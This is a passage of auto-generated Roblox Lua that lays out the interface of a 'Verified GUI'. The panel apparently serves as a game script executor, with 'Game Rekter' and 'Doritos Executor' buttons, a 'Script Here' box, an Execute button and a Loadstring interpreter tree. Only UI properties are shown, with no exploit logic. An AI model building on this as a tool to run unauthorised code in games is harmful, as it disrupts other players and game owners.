G2L["362"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["362"].Visible = true
G2L["362"].ZIndex = 1
G2L["362"].Parent = G2L["359"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.TextButton_Roundify_12px
G2L["363"].Name = [[TextButton_Roundify_12px]]
G2L["363"].Image = [[rbxassetid://3570695787]]
G2L["363"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["363"].ScaleType = Enum.ScaleType.Slice
G2L["363"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["363"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["363"].Active = true
G2L["363"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["363"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["363"].BackgroundTransparency = 1
G2L["363"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["363"].BorderSizePixel = 1
G2L["363"].ClipsDescendants = false
G2L["363"].Draggable = false
G2L["363"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["363"].Rotation = 0
G2L["363"].Selectable = true
G2L["363"].SelectionOrder = 0
G2L["363"].Size = UDim2.new(1, 0, 1, 0)
G2L["363"].Visible = true
G2L["363"].ZIndex = 1
G2L["363"].Parent = G2L["357"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.Script
G2L["364"].Name = [[Script]]
G2L["364"].Parent = G2L["357"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ]
G2L["365"].Name = [[Doritos Executor [ OP ]]]
G2L["365"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["365"].Text = [[Doritos Executor [ OP ]]]
G2L["365"].TextColor3 = Color3.fromRGB(255, 240, 240)
G2L["365"].TextScaled = true
G2L["365"].TextSize = 14
G2L["365"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["365"].TextStrokeTransparency = 1
G2L["365"].TextWrapped = true
G2L["365"].TextXAlignment = Enum.TextXAlignment.Center
G2L["365"].TextYAlignment = Enum.TextYAlignment.Center
G2L["365"].Active = true
G2L["365"].AnchorPoint = Vector2.new(0, 0)
G2L["365"].BackgroundColor3 = Color3.fromRGB(200, 0, 255)
G2L["365"].BackgroundTransparency = 0.5
G2L["365"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["365"].BorderSizePixel = 0
G2L["365"].ClipsDescendants = false
G2L["365"].Draggable = false
G2L["365"].Position = UDim2.new(0, 0, 0, 0)
G2L["365"].Rotation = 0
G2L["365"].Selectable = true
G2L["365"].SelectionOrder = 0
G2L["365"].Size = UDim2.new(0, 200, 0, 50)
G2L["365"].Visible = true
G2L["365"].ZIndex = 1
G2L["365"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].UICorner
G2L["366"].Name = [[UICorner]]
G2L["366"].CornerRadius = UDim.new(0, 8)
G2L["366"].Parent = G2L["365"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder
G2L["367"].Name = [[shadowHolder]]
G2L["367"].Active = false
G2L["367"].AnchorPoint = Vector2.new(0, 0)
G2L["367"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["367"].BackgroundTransparency = 1
G2L["367"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["367"].BorderSizePixel = 1
G2L["367"].ClipsDescendants = false
G2L["367"].Draggable = false
G2L["367"].Position = UDim2.new(0, 0, 0, 0)
G2L["367"].Rotation = 0
G2L["367"].Selectable = false
G2L["367"].SelectionOrder = 0
G2L["367"].Size = UDim2.new(1, 0, 1, 0)
G2L["367"].Visible = true
G2L["367"].ZIndex = -1
G2L["367"].Parent = G2L["365"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder.umbraShadow
G2L["368"].Name = [[umbraShadow]]
G2L["368"].Image = [[rbxassetid://1316045217]]
G2L["368"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["368"].ScaleType = Enum.ScaleType.Slice
G2L["368"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["368"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["368"].Active = false
G2L["368"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["368"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["368"].BackgroundTransparency = 1
G2L["368"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["368"].BorderSizePixel = 1
G2L["368"].ClipsDescendants = false
G2L["368"].Draggable = false
G2L["368"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["368"].Rotation = 0
G2L["368"].Selectable = false
G2L["368"].SelectionOrder = 0
G2L["368"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["368"].Visible = true
G2L["368"].ZIndex = 1
G2L["368"].Parent = G2L["367"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder.penumbraShadow
G2L["369"].Name = [[penumbraShadow]]
G2L["369"].Image = [[rbxassetid://1316045217]]
G2L["369"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["369"].ScaleType = Enum.ScaleType.Slice
G2L["369"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["369"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["369"].Active = false
G2L["369"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["369"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["369"].BackgroundTransparency = 1
G2L["369"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["369"].BorderSizePixel = 1
G2L["369"].ClipsDescendants = false
G2L["369"].Draggable = false
G2L["369"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["369"].Rotation = 0
G2L["369"].Selectable = false
G2L["369"].SelectionOrder = 0
G2L["369"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["369"].Visible = true
G2L["369"].ZIndex = 1
G2L["369"].Parent = G2L["367"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder.ambientShadow
G2L["370"].Name = [[ambientShadow]]
G2L["370"].Image = [[rbxassetid://1316045217]]
G2L["370"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["370"].ScaleType = Enum.ScaleType.Slice
G2L["370"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["370"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["370"].Active = false
G2L["370"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["370"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["370"].BackgroundTransparency = 1
G2L["370"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["370"].BorderSizePixel = 1
G2L["370"].ClipsDescendants = false
G2L["370"].Draggable = false
G2L["370"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["370"].Rotation = 0
G2L["370"].Selectable = false
G2L["370"].SelectionOrder = 0
G2L["370"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["370"].Visible = true
G2L["370"].ZIndex = 1
G2L["370"].Parent = G2L["367"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].TextButton_Roundify_12px
G2L["371"].Name = [[TextButton_Roundify_12px]]
G2L["371"].Image = [[rbxassetid://3570695787]]
G2L["371"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["371"].ScaleType = Enum.ScaleType.Slice
G2L["371"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["371"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["371"].Active = true
G2L["371"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["371"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["371"].BackgroundTransparency = 1
G2L["371"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["371"].BorderSizePixel = 1
G2L["371"].ClipsDescendants = false
G2L["371"].Draggable = false
G2L["371"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["371"].Rotation = 0
G2L["371"].Selectable = true
G2L["371"].SelectionOrder = 0
G2L["371"].Size = UDim2.new(1, 0, 1, 0)
G2L["371"].Visible = true
G2L["371"].ZIndex = 1
G2L["371"].Parent = G2L["365"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].Script
G2L["372"].Name = [[Script]]
G2L["372"].Parent = G2L["365"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].LocalScript
G2L["373"].Name = [[LocalScript]]
G2L["373"].Parent = G2L["365"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].RemoteEvent
G2L["374"].Name = [[RemoteEvent]]
G2L["374"].Parent = G2L["365"]

--verified.Frame.ImageLabel.UICorner
G2L["375"].Name = [[UICorner]]
G2L["375"].CornerRadius = UDim.new(0, 8)
G2L["375"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Next
G2L["376"].Name = [[Next]]
G2L["376"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["376"].Text = [[>]]
G2L["376"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["376"].TextScaled = true
G2L["376"].TextSize = 14
G2L["376"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["376"].TextStrokeTransparency = 1
G2L["376"].TextWrapped = true
G2L["376"].TextXAlignment = Enum.TextXAlignment.Center
G2L["376"].TextYAlignment = Enum.TextYAlignment.Center
G2L["376"].Active = true
G2L["376"].AnchorPoint = Vector2.new(0, 0)
G2L["376"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["376"].BackgroundTransparency = 1
G2L["376"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["376"].BorderSizePixel = 1
G2L["376"].ClipsDescendants = false
G2L["376"].Draggable = false
G2L["376"].Position = UDim2.new(0.8500747, 1, 0.0018422476, 0)
G2L["376"].Rotation = 0
G2L["376"].Selectable = true
G2L["376"].SelectionOrder = 0
G2L["376"].Size = UDim2.new(0, 51, 0, 50)
G2L["376"].Visible = true
G2L["376"].ZIndex = 2
G2L["376"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Next.LocalScript
G2L["377"].Name = [[LocalScript]]
G2L["377"].Parent = G2L["376"]

--verified.Frame.ImageLabel.ImageLabel
G2L["378"].Name = [[ImageLabel]]
G2L["378"].Image = [[rbxassetid://12883411704]]
G2L["378"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["378"].ScaleType = Enum.ScaleType.Stretch
G2L["378"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["378"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["378"].Active = false
G2L["378"].AnchorPoint = Vector2.new(0, 0)
G2L["378"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["378"].BackgroundTransparency = 1
G2L["378"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["378"].BorderSizePixel = 1
G2L["378"].ClipsDescendants = false
G2L["378"].Draggable = false
G2L["378"].Position = UDim2.new(0.009375, 0, 0.08934708, 0)
G2L["378"].Rotation = 0
G2L["378"].Selectable = false
G2L["378"].SelectionOrder = 0
G2L["378"].Size = UDim2.new(0, 23, 0, 24)
G2L["378"].Visible = true
G2L["378"].ZIndex = 1
G2L["378"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Page 2
G2L["379"].Name = [[Page 2]]
G2L["379"].BottomImage = [[rbxasset://textures/ui/Scroll/scroll-bottom.png]]
G2L["379"].CanvasSize = UDim2.new(0, 0, 2, 0)
G2L["379"].HorizontalScrollBarInset = Enum.ScrollBarInset.None
G2L["379"].ScrollBarThickness = 12
G2L["379"].TopImage = [[rbxasset://textures/ui/Scroll/scroll-top.png]]
G2L["379"].Active = true
G2L["379"].AnchorPoint = Vector2.new(0, 0)
G2L["379"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["379"].BackgroundTransparency = 1
G2L["379"].BorderColor3 = Color3.fromRGB(100, 100, 100)
G2L["379"].BorderSizePixel = 3
G2L["379"].ClipsDescendants = true
G2L["379"].Draggable = false
G2L["379"].Position = UDim2.new(0, 0, 0.13863544, 0)
G2L["379"].Rotation = 0
G2L["379"].Selectable = true
G2L["379"].SelectionOrder = 0
G2L["379"].Size = UDim2.new(0, 640, 0, 415)
G2L["379"].Visible = false
G2L["379"].ZIndex = 1
G2L["379"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Page 2.ImageButton
G2L["380"].Name = [[ImageButton]]
G2L["380"].Image = [[rbxassetid://1249553900]]
G2L["380"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["380"].ScaleType = Enum.ScaleType.Stretch
G2L["380"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["380"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["380"].Active = true
G2L["380"].AnchorPoint = Vector2.new(0, 0)
G2L["380"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["380"].BackgroundTransparency = 1
G2L["380"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["380"].BorderSizePixel = 1
G2L["380"].ClipsDescendants = false
G2L["380"].Draggable = false
G2L["380"].Position = UDim2.new(0.031249953, 0, 0.020214068, 0)
G2L["380"].Rotation = 0
G2L["380"].Selectable = true
G2L["380"].SelectionOrder = 0
G2L["380"].Size = UDim2.new(0, 84, 0, 65)
G2L["380"].Visible = true
G2L["380"].ZIndex = 1
G2L["380"].Parent = G2L["379"]

--verified.Frame.ImageLabel.Page 2.ImageButton.LocalScript
G2L["381"].Name = [[LocalScript]]
G2L["381"].Parent = G2L["380"]

--verified.Frame.ImageLabel.Page 2.ImageButton
G2L["382"].Name = [[ImageButton]]
G2L["382"].Image = [[rbxassetid://1402032193]]
G2L["382"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["382"].ScaleType = Enum.ScaleType.Stretch
G2L["382"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["382"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["382"].Active = true
G2L["382"].AnchorPoint = Vector2.new(0, 0)
G2L["382"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["382"].BackgroundTransparency = 1
G2L["382"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["382"].BorderSizePixel = 1
G2L["382"].ClipsDescendants = false
G2L["382"].Draggable = false
G2L["382"].Position = UDim2.new(0.18281245, 0, 0.020214068, 0)
G2L["382"].Rotation = 0
G2L["382"].Selectable = true
G2L["382"].SelectionOrder = 0
G2L["382"].Size = UDim2.new(0, 84, 0, 65)
G2L["382"].Visible = true
G2L["382"].ZIndex = 1
G2L["382"].Parent = G2L["379"]

--verified.Frame.ImageLabel.Page 2.ImageButton.LocalScript
G2L["383"].Name = [[LocalScript]]
G2L["383"].Parent = G2L["382"]

--verified.Frame.ImageLabel.Page 2.TextButton
G2L["384"].Name = [[TextButton]]
G2L["384"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["384"].Text = [[Hide]]
G2L["384"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["384"].TextScaled = true
G2L["384"].TextSize = 14
G2L["384"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["384"].TextStrokeTransparency = 1
G2L["384"].TextWrapped = true
G2L["384"].TextXAlignment = Enum.TextXAlignment.Center
G2L["384"].TextYAlignment = Enum.TextYAlignment.Center
G2L["384"].Active = true
G2L["384"].AnchorPoint = Vector2.new(0, 0)
G2L["384"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["384"].BackgroundTransparency = 1
G2L["384"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["384"].BorderSizePixel = 1
G2L["384"].ClipsDescendants = false
G2L["384"].Draggable = false
G2L["384"].Position = UDim2.new(0.29999998, 0, 0.028174309, 0)
G2L["384"].Rotation = 0
G2L["384"].Selectable = true
G2L["384"].SelectionOrder = 0
G2L["384"].Size = UDim2.new(0, 117, 0, 50)
G2L["384"].Visible = true
G2L["384"].ZIndex = 1
G2L["384"].Parent = G2L["379"]

--verified.Frame.ImageLabel.Page 2.TextButton.LocalScript
G2L["385"].Name = [[LocalScript]]
G2L["385"].Parent = G2L["384"]

--verified.Frame.ImageLabel.Page 2.TextButton
G2L["386"].Name = [[TextButton]]
G2L["386"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["386"].Text = [[News]]
G2L["386"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["386"].TextScaled = true
G2L["386"].TextSize = 14
G2L["386"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["386"].TextStrokeTransparency = 1
G2L["386"].TextWrapped = true
G2L["386"].TextXAlignment = Enum.TextXAlignment.Center
G2L["386"].TextYAlignment = Enum.TextYAlignment.Center
G2L["386"].Active = true
G2L["386"].AnchorPoint = Vector2.new(0, 0)
G2L["386"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["386"].BackgroundTransparency = 1
G2L["386"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["386"].BorderSizePixel = 1
G2L["386"].ClipsDescendants = false
G2L["386"].Draggable = false
G2L["386"].Position = UDim2.new(0.47187498, 0, 0.028174309, 0)
G2L["386"].Rotation = 0
G2L["386"].Selectable = true
G2L["386"].SelectionOrder = 0
G2L["386"].Size = UDim2.new(0, 117, 0, 50)
G2L["386"].Visible = true
G2L["386"].ZIndex = 1
G2L["386"].Parent = G2L["379"]

--verified.Frame.ImageLabel.Page 2.TextButton.LocalScript
G2L["387"].Name = [[LocalScript]]
G2L["387"].Parent = G2L["386"]

--verified.Frame.ImageLabel.TitleShadow
G2L["388"].Name = [[TitleShadow]]
G2L["388"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["388"].Text = [[Verified GUI]]
G2L["388"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["388"].TextScaled = true
G2L["388"].TextSize = 14
G2L["388"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["388"].TextStrokeTransparency = 1
G2L["388"].TextWrapped = true
G2L["388"].TextXAlignment = Enum.TextXAlignment.Center
G2L["388"].TextYAlignment = Enum.TextYAlignment.Center
G2L["388"].Active = false
G2L["388"].AnchorPoint = Vector2.new(0, 0)
G2L["388"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["388"].BackgroundTransparency = 0
G2L["388"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["388"].BorderSizePixel = 0
G2L["388"].ClipsDescendants = false
G2L["388"].Draggable = false
G2L["388"].Position = UDim2.new(-0.004745388, 0, 0, 0)
G2L["388"].Rotation = 0
G2L["388"].Selectable = false
G2L["388"].SelectionOrder = 0
G2L["388"].Size = UDim2.new(0, 640, 0, 53)
G2L["388"].Visible = true
G2L["388"].ZIndex = 1
G2L["388"].Parent = G2L["2"]

--verified.Frame.ImageLabel.TitleShadow.shadowHolder
G2L["389"].Name = [[shadowHolder]]
G2L["389"].Active = false
G2L["389"].AnchorPoint = Vector2.new(0, 0)
G2L["389"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["389"].BackgroundTransparency = 1
G2L["389"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["389"].BorderSizePixel = 1
G2L["389"].ClipsDescendants = false
G2L["389"].Draggable = false
G2L["389"].Position = UDim2.new(0, 0, 0, 0)
G2L["389"].Rotation = 0
G2L["389"].Selectable = false
G2L["389"].SelectionOrder = 0
G2L["389"].Size = UDim2.new(1, 0, 1, 0)
G2L["389"].Visible = true
G2L["389"].ZIndex = -1
G2L["389"].Parent = G2L["388"]

--verified.Frame.ImageLabel.TitleShadow.UICorner
G2L["390"].Name = [[UICorner]]
G2L["390"].CornerRadius = UDim.new(0, 10)
G2L["390"].Parent = G2L["388"]

--verified.Frame.ImageLabel.Close
G2L["391"].Name = [[Close]]
G2L["391"].Image = [[rbxassetid://5198838744]]
G2L["391"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["391"].ScaleType = Enum.ScaleType.Stretch
G2L["391"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["391"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["391"].Active = true
G2L["391"].AnchorPoint = Vector2.new(0, 0)
G2L["391"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["391"].BackgroundTransparency = 0
G2L["391"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["391"].BorderSizePixel = 0
G2L["391"].ClipsDescendants = false
G2L["391"].Draggable = false
G2L["391"].Position = UDim2.new(0.9994972, 0, 0.62146634, 0)
G2L["391"].Rotation = 0
G2L["391"].Selectable = true
G2L["391"].SelectionOrder = 0
G2L["391"].Size = UDim2.new(0, 48, 0, 39)
G2L["391"].Visible = true
G2L["391"].ZIndex = 1
G2L["391"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Close.LocalScript
G2L["392"].Name = [[LocalScript]]
G2L["392"].Parent = G2L["391"]

--verified.Frame.ImageLabel.Page 3
G2L["393"].Name = [[Page 3]]
G2L["393"].BottomImage = [[rbxasset://textures/ui/Scroll/scroll-bottom.png]]
G2L["393"].CanvasSize = UDim2.new(0, 0, 2, 0)
G2L["393"].HorizontalScrollBarInset = Enum.ScrollBarInset.None
G2L["393"].ScrollBarThickness = 12
G2L["393"].TopImage = [[rbxasset://textures/ui/Scroll/scroll-top.png]]
G2L["393"].Active = true
G2L["393"].AnchorPoint = Vector2.new(0, 0)
G2L["393"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["393"].BackgroundTransparency = 1
G2L["393"].BorderColor3 = Color3.fromRGB(100, 100, 100)
G2L["393"].BorderSizePixel = 3
G2L["393"].ClipsDescendants = true
G2L["393"].Draggable = false
G2L["393"].Position = UDim2.new(0, 0, 0.13863544, 0)
G2L["393"].Rotation = 0
G2L["393"].Selectable = true
G2L["393"].SelectionOrder = 0
G2L["393"].Size = UDim2.new(0, 640, 0, 415)
G2L["393"].Visible = false
G2L["393"].ZIndex = 1
G2L["393"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Page 3.Execute
G2L["394"].Name = [[Execute]]
G2L["394"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["394"].Text = [[Execute]]
G2L["394"].TextColor3 = Color3.fromRGB(100.00001, 100.00001, 100.00001)
G2L["394"].TextScaled = true
G2L["394"].TextSize = 14
G2L["394"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["394"].TextStrokeTransparency = 0
G2L["394"].TextWrapped = true
G2L["394"].TextXAlignment = Enum.TextXAlignment.Center
G2L["394"].TextYAlignment = Enum.TextYAlignment.Center
G2L["394"].Active = true
G2L["394"].AnchorPoint = Vector2.new(0, 0)
G2L["394"].BackgroundColor3 = Color3.fromRGB(76, 76, 76)
G2L["394"].BackgroundTransparency = 0
G2L["394"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["394"].BorderSizePixel = 1
G2L["394"].ClipsDescendants = false
G2L["394"].Draggable = false
G2L["394"].Position = UDim2.new(0.3109375, 0, 0.31245434, 0)
G2L["394"].Rotation = 0
G2L["394"].Selectable = true
G2L["394"].SelectionOrder = 0
G2L["394"].Size = UDim2.new(0, 212, 0, 50)
G2L["394"].Visible = true
G2L["394"].ZIndex = 1
G2L["394"].Parent = G2L["393"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'
G2L["395"].Name = [[yes']]
G2L["395"].Parent = G2L["394"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script
G2L["396"].Name = [[Script]]
G2L["396"].Parent = G2L["395"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring
G2L["397"].Name = [[Loadstring]]
G2L["397"].Parent = G2L["396"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaZ
G2L["398"].Name = [[LuaZ]]
G2L["398"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaX
G2L["399"].Name = [[LuaX]]
G2L["399"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaY
G2L["400"].Name = [[LuaY]]
G2L["400"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaU
G2L["401"].Name = [[LuaU]]
G2L["401"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaP
G2L["402"].Name = [[LuaP]]
G2L["402"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaK
G2L["403"].Name = [[LuaK]]
G2L["403"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LBI
G2L["404"].Name = [[LBI]]
G2L["404"].Parent = G2L["397"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.LocalScript
G2L["405"].Name = [[LocalScript]]
G2L["405"].Parent = G2L["396"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.RemoteEvent
G2L["406"].Name = [[RemoteEvent]]
G2L["406"].Parent = G2L["396"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.buton
G2L["407"].Name = [[buton]]
G2L["407"].Parent = G2L["396"]

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.text
G2L["408"].Name = [[text]]
G2L["408"].Parent = G2L["396"]

--verified.Frame.ImageLabel.Page 3.Box
G2L["409"].Name = [[Box]]
G2L["409"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["409"].MultiLine = false
G2L["409"].PlaceholderColor3 = Color3.new(0.69803923, 0.69803923, 0.69803923)
G2L["409"].PlaceholderText = [[Script Here]]
G2L["409"].Text = [[]]
G2L["409"].TextColor3 = Color3.fromRGB(178, 178, 178)
G2L["409"].TextScaled = true
G2L["409"].TextSize = 14
G2L["409"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["409"].TextStrokeTransparency = 1
G2L["409"].TextWrapped = true
G2L["409"].TextXAlignment = Enum.TextXAlignment.Center
G2L["409"].TextYAlignment = Enum.TextYAlignment.Center
G2L["409"].Active = true
G2L["409"].AnchorPoint = Vector2.new(0, 0)
G2L["409"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["409"].BackgroundTransparency = 0
G2L["409"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["409"].BorderSizePixel = 1
G2L["409"].ClipsDescendants = false
G2L["409"].Draggable = false
G2L["409"].Position = UDim2.new(0.1109375, 0, 0.017938081, 0)
G2L["409"].Rotation = 0
G2L["409"].Selectable = true
G2L["409"].SelectionOrder = 0
G2L["409"].Size = UDim2.new(0, 498, 0, 278)
G2L["409"].Visible = true
G2L["409"].ZIndex = 1
G2L["409"].Parent = G2L["393"]

--verified.Frame.ImageLabel.search
G2L["410"].Name = [[search]]
G2L["410"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["410"].MultiLine = false
G2L["410"].PlaceholderColor3 = Color3.new(0.54509807, 0.54509807, 0.54509807)
G2L["410"].PlaceholderText = [[Search...]]
G2L["410"].Text = [[]]
G2L["410"].TextColor3 = Color3.fromRGB(0, 0, 0)
G2L["410"].TextScaled = true
G2L["410"].TextSize = 14
G2L["410"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["410"].TextStrokeTransparency = 1
G2L["410"].TextWrapped = true
G2L["410"].TextXAlignment = Enum.TextXAlignment.Left
G2L["410"].TextYAlignment = Enum.TextYAlignment.Center
G2L["410"].Active = true
G2L["410"].AnchorPoint = Vector2.new(0, 0)
G2L["410"].BackgroundColor3 = Color3.fromRGB(54.000004, 54.000004, 54.000004)
G2L["410"].BackgroundTransparency = 0
G2L["410"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["410"].BorderSizePixel = 0
G2L["410"].ClipsDescendants = false
G2L["410"].Draggable = false
G2L["410"].Position = UDim2.new(0.06269597, 0, 0.09341501, 0)
G2L["410"].Rotation = 0
G2L["410"].Selectable = true
G2L["410"].SelectionOrder = 0
G2L["410"].Size = UDim2.new(0, 570, 0, 21)
G2L["410"].Visible = true
G2L["410"].ZIndex = 1
G2L["410"].Parent = G2L["2"]

--verified.Frame.ImageLabel.search.UICorner
G2L["411"].Name = [[UICorner]]
G2L["411"].CornerRadius = UDim.new(0, 8)
G2L["411"].Parent = G2L["410"]

--verified.Frame.ImageLabel.LocalScript
G2L["412"].Name = [[LocalScript]]
G2L["412"].Parent = G2L["2"]

--verified.Frame.Open
G2L["413"].Name = [[Open]]
